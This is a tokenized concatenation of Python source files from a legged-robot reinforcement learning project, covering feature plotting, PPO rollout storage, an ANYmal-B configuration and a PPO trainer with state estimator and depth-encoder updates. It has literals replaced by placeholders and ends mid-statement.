unique_labels = np . unique ( labels ) <EOL> i = <NUM_LIT> <EOL> for label in unique_labels : <EOL> indices = np . where ( labels == label ) <EOL> x = tsne_features [ indices , <NUM_LIT> ] <EOL> y = tsne_features [ indices , <NUM_LIT> ] <EOL> ax . scatter ( x , y , label = label , alpha = <NUM_LIT> , marker = "<STR_LIT>" ) <EOL> if i == <NUM_LIT> : <EOL> break <EOL> i += <NUM_LIT> <EOL> ax . legend ( ) <EOL> plt . title ( f'<STR_LIT>' ) <EOL> plt . show ( ) <EOL> if args . histogram : <EOL> feature_t = features [ : , : <NUM_LIT> ] <EOL> fig , axes = plt . subplots ( <NUM_LIT> , <NUM_LIT> , figsize = ( <NUM_LIT> , <NUM_LIT> ) ) <EOL> for i in range ( <NUM_LIT> ) : <EOL> ax = axes [ i // <NUM_LIT> , i % <NUM_LIT> ] <EOL> f0 = feature_t [ labels == i ] + <NUM_LIT> <EOL> uniques , counts = np . unique ( f0 , axis = <NUM_LIT> , return_counts = True ) <EOL> print ( uniques . shape , counts . shape ) <EOL> uniques_dec = uniques [ : , <NUM_LIT> ] * <NUM_LIT> + uniques [ : , <NUM_LIT> ] * <NUM_LIT> + uniques [ : , <NUM_LIT> ] * <NUM_LIT> + uniques [ : , <NUM_LIT> ] <EOL> print ( uniques_dec . shape ) <EOL> hist_values = np . repeat ( uniques_dec , counts ) <EOL> ax . hist ( hist_values , bins = len ( uniques_dec ) + <NUM_LIT> ) <EOL> ax . set_xlabel <EOL> ax . set_xlabel ( "<STR_LIT>" ) <EOL> ax . set_ylabel ( "<STR_LIT>" ) <EOL> ax . set_title ( "<STR_LIT>" ) <EOL> if args . traj : <EOL> print ( "<STR_LIT>" * width , "<STR_LIT>" , "<STR_LIT>" * width ) <EOL> def draw_traj ( features , labels , xlim , ylim , xlabel , ylabel ) : <EOL> height = features [ : , <NUM_LIT> ] <EOL> pitch = features [ : , <NUM_LIT> ] <EOL> unique_labels = np . unique ( labels ) <EOL> fig , axes = plt . subplots ( <NUM_LIT> , unique_labels . shape [ <NUM_LIT> ] // <NUM_LIT> , figsize = ( <NUM_LIT> , <NUM_LIT> ) ) <EOL> for i , label in enumerate ( unique_labels ) : <EOL> indices = np . where ( labels == label ) <EOL> x = height [ indices ] <EOL> y = pitch [ indices ] <EOL> ax = axes [ i % <NUM_LIT> , i // <NUM_LIT> ] <EOL> ax . scatter ( x , y , label = label , alpha = <NUM_LIT> , marker = "<STR_LIT>" , color = "<STR_LIT>" ) <EOL> ax . legend ( ) <EOL> ax . set_xlim ( xlim ) <EOL> ax . set_ylim ( ylim ) <EOL> ax . set_xlabel ( xlabel ) <EOL> ax . set_ylabel ( ylabel ) <EOL> ax . set_title ( prefix ) <EOL> return fig <EOL> if args . jump : <EOL> fig = draw_traj ( features , labels , jump_xlim , jump_ylim , "<STR_LIT>" , "<STR_LIT>" ) <EOL> else : <EOL> fig = draw_traj ( features , labels , walk_xlim , walk_ylim , "<STR_LIT>" , "<STR_LIT>" ) <EOL> fig . savefig ( f"<STR_LIT>" , bbox_inches = '<STR_LIT>' ) <EOL> if args . coverage : <EOL> print ( "<STR_LIT>" * width , "<STR_LIT>" , "<STR_LIT>" * width ) <EOL> if args . jump : <EOL> bins , score = state_coverage ( features [ : , : <NUM_LIT> ] , dim1_range = jump_xlim , dim2_range = jump_ylim ) <EOL> else : <EOL> bins , score = state_coverage ( features [ : , : <NUM_LIT> ] , dim1_range = walk_xlim , dim2_range = walk_ylim ) <EOL> print ( f"<STR_LIT>" ) <EOL> norm_bins = np . clip ( bins / np . max ( bins ) , <NUM_LIT> , <NUM_LIT> ) <EOL> fig , ax = plt . subplots ( ) <EOL> ax . imshow ( norm_bins , cmap = "<STR_LIT>" , interpolation = "<STR_LIT>" ) <EOL> ax . set_title ( prefix + f"<STR_LIT>" ) <EOL> fig . savefig ( f"<STR_LIT>" , bbox_inches = '<STR_LIT>' ) <EOL> if args . scatter : <EOL> def scatter ( features , labels , xlim , ylim , xlabel , ylabel ) : <EOL> height = features [ : , <NUM_LIT> ] <EOL> pitch = features [ : , <NUM_LIT> ] <EOL> fig , ax = plt . subplots ( ) <EOL> unique_labels = np . unique ( labels ) <EOL> for i , label in enumerate ( unique_labels ) : <EOL> indices = np . where ( labels == label ) <EOL> x = height [ indices ] <EOL> y = pitch [ indices ] <EOL> ax . scatter ( x [ : ] , y [ : ] , label = label , alpha = <NUM_LIT> , marker = "<STR_LIT>" ) <EOL> ax . legend ( ) <EOL> ax . set_xlim ( xlim ) <EOL> ax . set_ylim ( ylim ) <EOL> ax . set_xlabel ( xlabel ) <EOL> ax . set_ylabel ( ylabel ) <EOL> ax . set_title ( prefix ) <EOL> return fig <EOL> if args . jump : <EOL> fig = scatter ( features , labels , jump_xlim , jump_ylim , "<STR_LIT>" , "<STR_LIT>" ) <EOL> else : <EOL> fig = scatter ( features , labels , walk_xlim , walk_ylim , "<STR_LIT>" , "<STR_LIT>" ) <EOL> fig . savefig ( f"<STR_LIT>" , bbox_inches = '<STR_LIT>' ) <EOL> </s>
<s> import torch <EOL> import numpy as np <EOL> from rsl_rl . utils import split_and_pad_trajectories <EOL> class RolloutStorage : <EOL> class Transition : <EOL> def __init__ ( self ) : <EOL> self . observations = None <EOL> self . critic_observations = None <EOL> self . actions = None <EOL> self . rewards = None <EOL> self . dones = None <EOL> self . values = None <EOL> self . actions_log_prob = None <EOL> self . action_mean = None <EOL> self . action_sigma = None <EOL> self . hidden_states = None <EOL> def clear ( self ) : <EOL> self . __init__ ( ) <EOL> def __init__ ( self , num_envs , num_transitions_per_env , obs_shape , privileged_obs_shape , actions_shape , device = '<STR_LIT>' ) : <EOL> self . device = device <EOL> self . obs_shape = obs_shape <EOL> self . privileged_obs_shape = privileged_obs_shape <EOL> self . actions_shape = actions_shape <EOL> self . observations = torch . zeros ( num_transitions_per_env , num_envs , * obs_shape , device = self . device ) <EOL> if privileged_obs_shape [ <NUM_LIT> ] is not None : <EOL> self . privileged_observations = torch . zeros ( num_transitions_per_env , num_envs , * privileged_obs_shape , device = self . device ) <EOL> else : <EOL> self . privileged_observations = None <EOL> self . rewards = torch . zeros ( num_transitions_per_env , num_envs , <NUM_LIT> , device = self . device ) <EOL> self . actions = torch . zeros ( num_transitions_per_env , num_envs , * actions_shape , device = self . device ) <EOL> self . dones = torch . zeros ( num_transitions_per_env , num_envs , <NUM_LIT> , device = self . device ) . byte ( ) <EOL> self . actions_log_prob = torch . zeros ( num_transitions_per_env , num_envs , <NUM_LIT> , device = self . device ) <EOL> self . values = torch . zeros ( num_transitions_per_env , num_envs , <NUM_LIT> , device = self . device ) <EOL> self . returns = torch . zeros ( num_transitions_per_env , num_envs , <NUM_LIT> , device = self . device ) <EOL> self . advantages = torch . zeros ( num_transitions_per_env , num_envs , <NUM_LIT> , device = self . device ) <EOL> self . mu = torch . zeros ( num_transitions_per_env , num_envs , * actions_shape , device = self . device ) <EOL> self . sigma = torch . zeros ( num_transitions_per_env , num_envs , * actions_shape , device = self . device ) <EOL> self . num_transitions_per_env = num_transitions_per_env <EOL> self . num_envs = num_envs <EOL> self . saved_hidden_states_a = None <EOL> self . saved_hidden_states_c = None <EOL> self . step = <NUM_LIT> <EOL> def add_transitions ( self , transition : Transition ) : <EOL> if self . step >= self . num_transitions_per_env : <EOL> raise AssertionError ( "<STR_LIT>" ) <EOL> self . observations [ self . step ] . copy_ ( transition . observations ) <EOL> if self . privileged_observations is not None : self . privileged_observations [ self . step ] . copy_ ( transition . critic_observations ) <EOL> self . actions [ self . step ] . copy_ ( transition . actions ) <EOL> self . rewards [ self . step ] . copy_ ( transition . rewards . view ( - <NUM_LIT> , <NUM_LIT> ) ) <EOL> self . dones [ self . step ] . copy_ ( transition . dones . view ( - <NUM_LIT> , <NUM_LIT> ) ) <EOL> self . values [ self . step ] . copy_ ( transition . values ) <EOL> self . actions_log_prob [ self . step ] . copy_ ( transition . actions_log_prob . view ( - <NUM_LIT> , <NUM_LIT> ) ) <EOL> self . mu [ self . step ] . copy_ ( transition . action_mean ) <EOL> self . sigma [ self . step ] . copy_ ( transition . action_sigma ) <EOL> self . _save_hidden_states ( transition . hidden_states ) <EOL> self . step += <NUM_LIT> <EOL> def _save_hidden_states ( self , hidden_states ) : <EOL> if hidden_states is None or hidden_states == ( None , None ) : <EOL> return <EOL> hid_a = hidden_states [ <NUM_LIT> ] if isinstance ( hidden_states [ <NUM_LIT> ] , tuple ) else ( hidden_states [ <NUM_LIT> ] , ) <EOL> hid_c = hidden_states [ <NUM_LIT> ] if isinstance ( hidden_states [ <NUM_LIT> ] , tuple ) else ( hidden_states [ <NUM_LIT> ] , ) <EOL> if self . saved_hidden_states_a is None : <EOL> self . saved_hidden_states_a = [ torch . zeros ( self . observations . shape [ <NUM_LIT> ] , * hid_a [ i ] . shape , device = self . device ) for i in range ( len ( hid_a ) ) ] <EOL> self . saved_hidden_states_c = [ torch . zeros ( self . observations . shape [ <NUM_LIT> ] , * hid_c [ i ] . shape , device = self . device ) for i in range ( len ( hid_c ) ) ] <EOL> for i in range ( len ( hid_a ) ) : <EOL> self . saved_hidden_states_a [ i ] [ self . step ] . copy_ ( hid_a [ i ] ) <EOL> self . saved_hidden_states_c [ i ] [ self . step ] . copy_ ( hid_c [ i ] ) <EOL> def clear ( self ) : <EOL> self . step = <NUM_LIT> <EOL> def compute_returns ( self , last_values , gamma , lam ) : <EOL> advantage = <NUM_LIT> <EOL> for step in reversed ( range ( self . num_transitions_per_env ) ) : <EOL> if step == self . num_transitions_per_env - <NUM_LIT> : <EOL> next_values = last_values <EOL> else : <EOL> next_values = self . values [ step + <NUM_LIT> ] <EOL> next_is_not_terminal = <NUM_LIT> - self . dones [ step ] . float ( ) <EOL> delta = self . rewards [ step ] + next_is_not_terminal * gamma * next_values - self . values [ step ] <EOL> advantage = delta + next_is_not_terminal * gamma * lam * advantage <EOL> self . returns [ step ] = advantage + self . values [ step ] <EOL> self . advantages = self . returns - self . values <EOL> self . advantages = ( self . advantages - self . advantages . mean ( ) ) / ( self . advantages . std ( ) + <NUM_LIT> ) <EOL> def get_statistics ( self ) : <EOL> done = self . dones <EOL> done [ - <NUM_LIT> ] = <NUM_LIT> <EOL> flat_dones = done . permute ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) . reshape ( - <NUM_LIT> , <NUM_LIT> ) <EOL> done_indices = torch . cat ( ( flat_dones . new_tensor ( [ - <NUM_LIT> ] , dtype = torch . int64 ) , flat_dones . nonzero ( as_tuple = False ) [ : , <NUM_LIT> ] ) ) <EOL> trajectory_lengths = ( done_indices [ <NUM_LIT> : ] - done_indices [ : - <NUM_LIT> ] ) <EOL> return trajectory_lengths . float ( ) . mean ( ) , self . rewards . mean ( ) <EOL> def mini_batch_generator ( self , num_mini_batches , num_epochs = <NUM_LIT> ) : <EOL> batch_size = self . num_envs * self . num_transitions_per_env <EOL> mini_batch_size = batch_size // num_mini_batches <EOL> indices = torch . randperm ( num_mini_batches * mini_batch_size , requires_grad = False , device = self . device ) <EOL> observations = self . observations . flatten ( <NUM_LIT> , <NUM_LIT> ) <EOL> if self . privileged_observations is not None : <EOL> critic_observations = self . privileged_observations . flatten ( <NUM_LIT> , <NUM_LIT> ) <EOL> else : <EOL> critic_observations = observations <EOL> actions = self . actions . flatten ( <NUM_LIT> , <NUM_LIT> ) <EOL> values = self . values . flatten ( <NUM_LIT> , <NUM_LIT> ) <EOL> returns = self . returns . flatten ( <NUM_LIT> , <NUM_LIT> ) <EOL> old_actions_log_prob = self . actions_log_prob . flatten ( <NUM_LIT> , <NUM_LIT> ) <EOL> advantages = self . advantages . flatten ( <NUM_LIT> , <NUM_LIT> ) <EOL> old_mu = self . mu . flatten ( <NUM_LIT> , <NUM_LIT> ) <EOL> old_sigma = self . sigma . flatten ( <NUM_LIT> , <NUM_LIT> ) <EOL> for epoch in range ( num_epochs ) : <EOL> for i in range ( num_mini_batches ) : <EOL> start = i * mini_batch_size <EOL> end = ( i + <NUM_LIT> ) * mini_batch_size <EOL> batch_idx = indices [ start : end ] <EOL> obs_batch = observations [ batch_idx ] <EOL> critic_observations_batch = critic_observations [ batch_idx ] <EOL> actions_batch = actions [ batch_idx ] <EOL> target_values_batch = values [ batch_idx ] <EOL> returns_batch = returns [ batch_idx ] <EOL> old_actions_log_prob_batch = old_actions_log_prob [ batch_idx ] <EOL> advantages_batch = advantages [ batch_idx ] <EOL> old_mu_batch = old_mu [ batch_idx ] <EOL> old_sigma_batch = old_sigma [ batch_idx ] <EOL> yield obs_batch , critic_observations_batch , actions_batch , target_values_batch , advantages_batch , returns_batch , old_actions_log_prob_batch , old_mu_batch , old_sigma_batch , ( None , None ) , None <EOL> def reccurent_mini_batch_generator ( self , num_mini_batches , num_epochs = <NUM_LIT> ) : <EOL> padded_obs_trajectories , trajectory_masks = split_and_pad_trajectories ( self . observations , self . dones ) <EOL> if self . privileged_observations is not None : <EOL> padded_critic_obs_trajectories , _ = split_and_pad_trajectories ( self . privileged_observations , self . dones ) <EOL> else : <EOL> padded_critic_obs_trajectories = padded_obs_trajectories <EOL> mini_batch_size = self . num_envs // num_mini_batches <EOL> for ep in range ( num_epochs ) : <EOL> first_traj = <NUM_LIT> <EOL> for i in range ( num_mini_batches ) : <EOL> start = i * mini_batch_size <EOL> stop = ( i + <NUM_LIT> ) * mini_batch_size <EOL> dones = self . dones . squeeze ( - <NUM_LIT> ) <EOL> last_was_done = torch . zeros_like ( dones , dtype = torch . bool ) <EOL> last_was_done [ <NUM_LIT> : ] = dones [ : - <NUM_LIT> ] <EOL> last_was_done [ <NUM_LIT> ] = True <EOL> trajectories_batch_size = torch . sum ( last_was_done [ : , start : stop ] ) <EOL> last_traj = first_traj + trajectories_batch_size <EOL> masks_batch = trajectory_masks [ : , first_traj : last_traj ] <EOL> obs_batch = padded_obs_trajectories [ : , first_traj : last_traj ] <EOL> critic_obs_batch = padded_critic_obs_trajectories [ : , first_traj : last_traj ] <EOL> actions_batch = self . actions [ : , start : stop ] <EOL> old_mu_batch = self . mu [ : , start : stop ] <EOL> old_sigma_batch = self . sigma [ : , start : stop ] <EOL> returns_batch = self . returns [ : , start : stop ] <EOL> advantages_batch = self . advantages [ : , start : stop ] <EOL> values_batch = self . values [ : , start : stop ] <EOL> old_actions_log_prob_batch = self . actions_log_prob [ : , start : stop ] <EOL> last_was_done = last_was_done . permute ( <NUM_LIT> , <NUM_LIT> ) <EOL> hid_a_batch = [ saved_hidden_states . permute ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) [ last_was_done ] [ first_traj : last_traj ] . transpose ( <NUM_LIT> , <NUM_LIT> ) . contiguous ( ) <EOL> for saved_hidden_states in self . saved_hidden_states_a ] <EOL> hid_c_batch = [ saved_hidden_states . permute ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) [ last_was_done ] [ first_traj : last_traj ] . transpose ( <NUM_LIT> , <NUM_LIT> ) . contiguous ( ) <EOL> for saved_hidden_states in self . saved_hidden_states_c ] <EOL> hid_a_batch = hid_a_batch [ <NUM_LIT> ] if len ( hid_a_batch ) == <NUM_LIT> else hid_a_batch <EOL> hid_c_batch = hid_c_batch [ <NUM_LIT> ] if len ( hid_c_batch ) == <NUM_LIT> else hid_a_batch <EOL> yield obs_batch , critic_obs_batch , actions_batch , values_batch , advantages_batch , returns_batch , old_actions_log_prob_batch , old_mu_batch , old_sigma_batch , ( hid_a_batch , hid_c_batch ) , masks_batch <EOL> first_traj = last_traj <EOL> </s>
<s> from legged_gym . envs import AnymalCRoughCfg , AnymalCRoughCfgPPO <EOL> class AnymalBRoughCfg ( AnymalCRoughCfg ) : <EOL> class asset ( AnymalCRoughCfg . asset ) : <EOL> file = '<STR_LIT>' <EOL> foot_name = '<STR_LIT>' <EOL> class rewards ( AnymalCRoughCfg . rewards ) : <EOL> class scales ( AnymalCRoughCfg . rewards . scales ) : <EOL> pass <EOL> class AnymalBRoughCfgPPO ( AnymalCRoughCfgPPO ) : <EOL> class runner ( AnymalCRoughCfgPPO . runner ) : <EOL> run_name = '<STR_LIT>' <EOL> experiment_name = '<STR_LIT>' <EOL> load_run = - <NUM_LIT> <EOL> </s>
<s> import torch <EOL> import torch . nn as nn <EOL> import torch . optim as optim <EOL> from rsl_rl . modules import ActorCriticRMA <EOL> from rsl_rl . storage import RolloutStorage <EOL> import wandb <EOL> from rsl_rl . utils import unpad_trajectories <EOL> class RMS ( object ) : <EOL> def __init__ ( self , device , epsilon = <NUM_LIT> , shape = ( <NUM_LIT> , ) ) : <EOL> self . M = torch . zeros ( shape , device = device ) <EOL> self . S = torch . ones ( shape , device = device ) <EOL> self . n = epsilon <EOL> def __call__ ( self , x ) : <EOL> bs = x . size ( <NUM_LIT> ) <EOL> delta = torch . mean ( x , dim = <NUM_LIT> ) - self . M <EOL> new_M = self . M + delta * bs / ( self . n + bs ) <EOL> new_S = ( self . S * self . n + torch . var ( x , dim = <NUM_LIT> ) * bs + ( delta ** <NUM_LIT> ) * self . n * bs / ( self . n + bs ) ) / ( self . n + bs ) <EOL> self . M = new_M <EOL> self . S = new_S <EOL> self . n += bs <EOL> return self . M , self . S <EOL> class PPO : <EOL> actor_critic : ActorCriticRMA <EOL> def __init__ ( self , <EOL> actor_critic , <EOL> estimator , <EOL> estimator_paras , <EOL> depth_encoder , <EOL> depth_encoder_paras , <EOL> depth_actor , <EOL> num_learning_epochs = <NUM_LIT> , <EOL> num_mini_batches = <NUM_LIT> , <EOL> clip_param = <NUM_LIT> , <EOL> gamma = <NUM_LIT> , <EOL> lam = <NUM_LIT> , <EOL> value_loss_coef = <NUM_LIT> , <EOL> entropy_coef = <NUM_LIT> , <EOL> learning_rate = <NUM_LIT> , <EOL> max_grad_norm = <NUM_LIT> , <EOL> use_clipped_value_loss = True , <EOL> schedule = "<STR_LIT>" , <EOL> desired_kl = <NUM_LIT> , <EOL> device = '<STR_LIT>' , <EOL> dagger_update_freq = <NUM_LIT> , <EOL> priv_reg_coef_schedual = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> ** kwargs <EOL> ) : <EOL> self . device = device <EOL> self . desired_kl = desired_kl <EOL> self . schedule = schedule <EOL> self . learning_rate = learning_rate <EOL> self . actor_critic = actor_critic <EOL> self . actor_critic . to ( self . device ) <EOL> self . storage = None <EOL> self . optimizer = optim . Adam ( self . actor_critic . parameters ( ) , lr = learning_rate ) <EOL> self . transition = RolloutStorage . Transition ( ) <EOL> self . clip_param = clip_param <EOL> self . num_learning_epochs = num_learning_epochs <EOL> self . num_mini_batches = num_mini_batches <EOL> self . value_loss_coef = value_loss_coef <EOL> self . entropy_coef = entropy_coef <EOL> self . gamma = gamma <EOL> self . lam = lam <EOL> self . max_grad_norm = max_grad_norm <EOL> self . use_clipped_value_loss = use_clipped_value_loss <EOL> self . hist_encoder_optimizer = optim . Adam ( self . actor_critic . actor . history_encoder . parameters ( ) , lr = learning_rate ) <EOL> self . priv_reg_coef_schedual = priv_reg_coef_schedual <EOL> self . counter = <NUM_LIT> <EOL> self . estimator = estimator <EOL> self . priv_states_dim = estimator_paras [ "<STR_LIT>" ] <EOL> self . num_prop = estimator_paras [ "<STR_LIT>" ] <EOL> self . num_scan = estimator_paras [ "<STR_LIT>" ] <EOL> self . estimator_optimizer = optim . Adam ( self . estimator . parameters ( ) , lr = estimator_paras [ "<STR_LIT>" ] ) <EOL> self . train_with_estimated_states = estimator_paras [ "<STR_LIT>" ] <EOL> self . if_depth = depth_encoder != None <EOL> if self . if_depth : <EOL> self . depth_encoder = depth_encoder <EOL> self . depth_encoder_optimizer = optim . Adam ( self . depth_encoder . parameters ( ) , lr = depth_encoder_paras [ "<STR_LIT>" ] ) <EOL> self . depth_encoder_paras = depth_encoder_paras <EOL> self . depth_actor = depth_actor <EOL> self . depth_actor_optimizer = optim . Adam ( [ * self . depth_actor . parameters ( ) , * self . depth_encoder . parameters ( ) ] , lr = depth_encoder_paras [ "<STR_LIT>" ] ) <EOL> def init_storage ( self , num_envs , num_transitions_per_env , actor_obs_shape , critic_obs_shape , action_shape ) : <EOL> self . storage = RolloutStorage ( num_envs , num_transitions_per_env , actor_obs_shape , critic_obs_shape , action_shape , self . device ) <EOL> def test_mode ( self ) : <EOL> self . actor_critic . test ( ) <EOL> def train_mode ( self ) : <EOL> self . actor_critic . train ( ) <EOL> def act ( self , obs , critic_obs , info , hist_encoding = False ) : <EOL> if self . actor_critic . is_recurrent : <EOL> self . transition . hidden_states = self . actor_critic . get_hidden_states ( ) <EOL> if self . train_with_estimated_states : <EOL> obs_est = obs . clone ( ) <EOL> priv_states_estimated = self . estimator ( obs_est [ : , : self . num_prop ] ) <EOL> obs_est [ : , self . num_prop + self . num_scan : self . num_prop + self . num_scan + self . priv_states_dim ] = priv_states_estimated <EOL> self . transition . actions = self . actor_critic . act ( obs_est , hist_encoding ) . detach ( ) <EOL> else : <EOL> self . transition . actions = self . actor_critic . act ( obs , hist_encoding ) . detach ( ) <EOL> self . transition . values = self . actor_critic . evaluate ( critic_obs ) . detach ( ) <EOL> self . transition . actions_log_prob = self . actor_critic . get_actions_log_prob ( self . transition . actions ) . detach ( ) <EOL> self . transition . action_mean = self . actor_critic . action_mean . detach ( ) <EOL> self . transition . action_sigma = self . actor_critic . action_std . detach ( ) <EOL> self . transition . observations = obs <EOL> self . transition . critic_observations = critic_obs <EOL> return self . transition . actions <EOL> def process_env_step ( self , rewards , dones , infos ) : <EOL> rewards_total = rewards . clone ( ) <EOL> self . transition . rewards = rewards_total . clone ( ) <EOL> self . transition . dones = dones <EOL> if '<STR_LIT>' in infos : <EOL> self . transition . rewards += self . gamma * torch . squeeze ( self . transition . values * infos [ '<STR_LIT>' ] . unsqueeze ( <NUM_LIT> ) . to ( self . device ) , <NUM_LIT> ) <EOL> self . storage . add_transitions ( self . transition ) <EOL> self . transition . clear ( ) <EOL> self . actor_critic . reset ( dones ) <EOL> return rewards_total <EOL> def compute_returns ( self , last_critic_obs ) : <EOL> last_values = self . actor_critic . evaluate ( last_critic_obs ) . detach ( ) <EOL> self . storage . compute_returns ( last_values , self . gamma , self . lam ) <EOL> def update ( self ) : <EOL> mean_value_loss = <NUM_LIT> <EOL> mean_surrogate_loss = <NUM_LIT> <EOL> mean_estimator_loss = <NUM_LIT> <EOL> mean_discriminator_loss = <NUM_LIT> <EOL> mean_discriminator_acc = <NUM_LIT> <EOL> mean_priv_reg_loss = <NUM_LIT> <EOL> if self . actor_critic . is_recurrent : <EOL> generator = self . storage . reccurent_mini_batch_generator ( self . num_mini_batches , self . num_learning_epochs ) <EOL> else : <EOL> generator = self . storage . mini_batch_generator ( self . num_mini_batches , self . num_learning_epochs ) <EOL> for obs_batch , critic_obs_batch , actions_batch , target_values_batch , advantages_batch , returns_batch , old_actions_log_prob_batch , old_mu_batch , old_sigma_batch , hid_states_batch , masks_batch in generator : <EOL> self . actor_critic . act ( obs_batch , masks = masks_batch , hidden_states = hid_states_batch [ <NUM_LIT> ] ) <EOL> actions_log_prob_batch = self . actor_critic . get_actions_log_prob ( actions_batch ) <EOL> value_batch = self . actor_critic . evaluate ( critic_obs_batch , masks = masks_batch , hidden_states = hid_states_batch [ <NUM_LIT> ] ) <EOL> mu_batch = self . actor_critic . action_mean <EOL> sigma_batch = self . actor_critic . action_std <EOL> entropy_batch = self . actor_critic . entropy <EOL> priv_latent_batch = self . actor_critic . actor . infer_priv_latent ( obs_batch ) <EOL> with torch . inference_mode ( ) : <EOL> hist_latent_batch = self . actor_critic . actor . infer_hist_latent ( obs_batch ) <EOL> priv_reg_loss = ( priv_latent_batch - hist_latent_batch . detach ( ) ) . norm ( p = <NUM_LIT> , dim = <NUM_LIT> ) . mean ( ) <EOL> priv_reg_stage = min ( max ( ( self . counter - self . priv_reg_coef_schedual [ <NUM_LIT> ] ) , <NUM_LIT> ) / self . priv_reg_coef_schedual [ <NUM_LIT> ] , <NUM_LIT> ) <EOL> priv_reg_coef = priv_reg_stage * ( self . priv_reg_coef_schedual [ <NUM_LIT> ] - self . priv_reg_coef_schedual [ <NUM_LIT> ] ) + self . priv_reg_coef_schedual [ <NUM_LIT> ] <EOL> priv_states_predicted = self . estimator ( obs_batch [ : , : self . num_prop ] ) <EOL> estimator_loss = ( priv_states_predicted - obs_batch [ : , self . num_prop + self . num_scan : self . num_prop + self . num_scan + self . priv_states_dim ] ) . pow ( <NUM_LIT> ) . mean ( ) <EOL> self . estimator_optimizer . zero_grad ( ) <EOL> estimator_loss . backward ( ) <EOL> nn . utils . clip_grad_norm_ ( self . estimator . parameters ( ) , self . max_grad_norm ) <EOL> self . estimator_optimizer . step ( ) <EOL> if self . desired_kl != None and self . schedule == '<STR_LIT>' : <EOL> with torch . inference_mode ( ) : <EOL> kl = torch . sum ( <EOL> torch . log ( sigma_batch / old_sigma_batch + <NUM_LIT> ) + ( torch . square ( old_sigma_batch ) + torch . square ( old_mu_batch - mu_batch ) ) / ( <NUM_LIT> * torch . square ( sigma_batch ) ) - <NUM_LIT> , axis = - <NUM_LIT> ) <EOL> kl_mean = torch . mean ( kl ) <EOL> if kl_mean > self . desired_kl * <NUM_LIT> : <EOL> self . learning_rate = max ( <NUM_LIT> , self . learning_rate / <NUM_LIT> ) <EOL> elif kl_mean < self . desired_kl / <NUM_LIT> and kl_mean > <NUM_LIT> : <EOL> self . learning_rate = min ( <NUM_LIT> , self . learning_rate * <NUM_LIT> ) <EOL> for param_group in self . optimizer . param_groups : <EOL> param_group [ '<STR_LIT>' ] = self . learning_rate <EOL> ratio = torch . exp ( actions_log_prob_batch - torch . squeeze ( old_actions_log_prob_batch ) ) <EOL> surrogate = - torch . squeeze ( advantages_batch ) * ratio <EOL> surrogate_clipped = - torch . squeeze ( advantages_batch ) * torch . clamp ( ratio , <NUM_LIT> - self . clip_param , <EOL> <NUM_LIT> + self . clip_param ) <EOL> surrogate_loss = torch . max ( surrogate , surrogate_clipped ) . mean ( ) <EOL> if self . use_clipped_value_loss : <EOL> value_clipped = target_values_batch + ( value_batch - target_values_batch ) . clamp ( - self . clip_param , <EOL> self . clip_param ) <EOL> value_losses = ( value_batch - returns_batch ) . pow ( <NUM_LIT> ) <EOL> value_losses_clipped = ( value_clipped - returns_batch ) . pow ( <NUM_LIT> ) <EOL> value_loss = torch . max ( value_losses , value_losses_clipped ) . mean ( ) <EOL> else : <EOL> value_loss = ( returns_batch - value_batch ) . pow ( <NUM_LIT> ) . mean ( ) <EOL> loss = surrogate_loss + self . value_loss_coef * value_loss - self . entropy_coef * entropy_batch . mean ( ) + priv_reg_coef * priv_reg_loss <EOL> self . optimizer . zero_grad ( ) <EOL> loss . backward ( ) <EOL> nn . utils . clip_grad_norm_ ( self . actor_critic . parameters ( ) , self . max_grad_norm ) <EOL> self . optimizer . step ( ) <EOL> mean_value_loss += value_loss . item ( ) <EOL> mean_surrogate_loss += surrogate_loss . item ( ) <EOL> mean_estimator_loss += estimator_loss . item ( ) <EOL> mean_priv_reg_loss += priv_reg_loss . item ( ) <EOL> mean_discriminator_loss += <NUM_LIT> <EOL> mean_discriminator_acc += <NUM_LIT> <EOL> num_updates = self . num_learning_epochs * self . num_mini_batches <EOL> mean_value_loss /= num_updates <EOL> mean_surrogate_loss /= num_updates <EOL> mean_estimator_loss /= num_updates <EOL> mean_priv_reg_loss /= num_updates <EOL> mean_discriminator_loss /= num_updates <EOL> mean_discriminator_acc /= num_updates <EOL> self . storage . clear ( ) <EOL> self . update_counter ( ) <EOL> return mean_value_loss , mean_surrogate_loss , mean_estimator_loss , mean_discriminator_loss , mean_discriminator_acc , mean_priv_reg_loss , priv_reg_coef <EOL> def update_dagger ( self ) : <EOL> mean_hist_latent_loss = <NUM_LIT> <EOL> if self . actor_critic . is_recurrent : <EOL> generator = self . storage . reccurent_mini_batch_generator ( self . num_mini_batches , self . num_learning_epochs ) <EOL> else : <EOL> generator = self . storage . mini_batch_generator ( self . num_mini_batches , self . num_learning_epochs ) <EOL> for obs_batch , critic_obs_batch , actions_batch , target_values_batch , advantages_batch , returns_batch , old_actions_log_prob_batch , old_mu_batch , old_sigma_batch , hid_states_batch , masks_batch in generator : <EOL> with torch . inference_mode ( ) : <EOL> self . actor_critic . act ( obs_batch , hist_encoding = True , masks = masks_batch , hidden_states = hid_states_batch [ <NUM_LIT> ] ) <EOL> with torch . inference_mode ( ) : <EOL> priv_latent_batch = self . actor_critic . actor . infer_priv_latent ( obs_batch ) <EOL> hist_latent_batch = self . actor_critic . actor . infer_hist_latent ( obs_batch ) <EOL> hist_latent_loss = ( priv_latent_batch . detach ( ) - hist_latent_batch ) . norm ( p = <NUM_LIT> , dim = <NUM_LIT> ) . mean ( ) <EOL> self . hist_encoder_optimizer . zero_grad ( ) <EOL> hist_latent_loss . backward ( ) <EOL> nn . utils . clip_grad_norm_ ( self . actor_critic . actor . history_encoder . parameters ( ) , self . max_grad_norm ) <EOL> self . hist_encoder_optimizer . step ( ) <EOL> mean_hist_latent_loss += hist_latent_loss . item ( ) <EOL> num_updates = self . num_learning_epochs * self . num_mini_batches <EOL> mean_hist_latent_loss /= num_updates <EOL> self . storage . clear ( ) <EOL> self . update_counter ( ) <EOL> return mean_hist_latent_loss <EOL> def update_depth_encoder ( self , depth_latent_batch , scandots_latent_batch ) : <EOL> if self . if_depth : <EOL> depth_encoder_loss = ( scandots_latent_batch . detach ( ) - depth_latent_batch ) . norm ( p = <NUM_LIT> , dim = <NUM_LIT> ) . mean ( ) <EOL> self . depth_encoder_optimizer . zero_grad ( ) <EOL> depth_encoder_loss . backward ( ) <EOL> nn . utils . clip_grad_norm_ ( self . depth_encoder . parameters ( ) , self . max_grad_norm ) <EOL> self . depth_encoder_optimizer . step 